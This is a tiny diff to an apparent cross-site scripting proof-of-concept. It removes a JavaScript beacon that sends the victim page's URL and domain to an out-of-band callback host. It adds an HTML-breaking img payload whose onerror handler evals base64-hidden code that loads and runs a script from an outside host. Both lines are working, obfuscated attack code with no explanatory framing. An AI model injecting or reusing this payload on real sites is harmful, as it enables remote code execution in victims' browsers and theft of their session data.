@@ -1,3 +1,1 @@
-// hosted at https://0xomn.github.io/xss-test/PoC.js
-new Image().src = "nnxsfcmrxzkstvbrqkyh2s28e057ar1fv.oast.fun/?u="+encodeURIComponent(location.href)+"&d="+document.domain+"&t="+Date.now();
-
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwL29uemRxbWRrMWUiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
